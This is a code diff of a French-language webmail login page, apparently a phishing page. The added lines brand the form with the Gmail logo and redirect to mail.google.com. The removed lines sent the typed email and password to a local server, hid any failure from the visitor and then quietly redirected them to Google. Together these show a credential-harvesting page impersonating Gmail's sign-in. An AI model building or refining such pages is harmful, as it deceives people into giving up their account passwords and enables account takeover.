@@ -12,7 +12,6 @@
       align-items: center;
       height: 100vh;
       margin: 0;
-      flex-direction: column;
     }
     .login-box {
       background: white;
@@ -21,6 +20,10 @@
       box-shadow: 0 4px 12px rgba(0,0,0,0.1);
       width: 350px;
       text-align: center;
+    }
+    .logo img {
+      width: 100px;
+      margin-bottom: 20px;
     }
     input[type="text"], input[type="password"] {
       width: 100%;
@@ -44,8 +47,11 @@
 </head>
 <body>
   <div class="login-box">
+    <div class="logo">
+      <img src="https://logos-world.net/wp-content/uploads/2020/11/Gmail-Logo.png" alt="Logo Gmail">
+    </div>
     <h2>Connexion à votre messagerie</h2>
-    <form onsubmit="showData(event)">
+    <form onsubmit="redirectToGmail(event)">
       <input type="text" id="email" placeholder="Adresse email" required>
       <input type="password" id="password" placeholder="Mot de passe" required>
       <button type="submit">Connexion</button>
@@ -53,45 +59,12 @@
   </div>
 
   <script>
-    function isValidEmail(email) {
-      const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/; // Expression régulière pour vérifier le format de l'email
-      return regex.test(email);
-    }
-
-    function showData(event) {
+    function redirectToGmail(event) {
       event.preventDefault();
-
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
-
-      // Vérification du format de l'email
-      if (!isValidEmail(email)) {
-        alert("L'adresse email n'est pas valide.");
-        return;
-      }
-
-      // Envoi des données au serveur
-      fetch("http://localhost:3000/login", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ email, password })
-      })
-      .then(response => response.json())
-      .then(data => {
-        if (data.success) {
-          // Connexion réussie, pas d'alerte d'échec
-          alert("Connexion réussie !");
-        }
-        // Pas de message d'échec ici
-        window.location.href = "https://www.google.com";
-      })
-      .catch(err => {
-        // Gestion discrète des erreurs réseau, sans afficher d'alerte d'échec
-        console.error("Erreur de connexion : ", err);
-      });
+      // Redirection immédiate vers Gmail
+      window.location.href = "https://mail.google.com/";
     }
   </script>
 </body>
 </html>
+
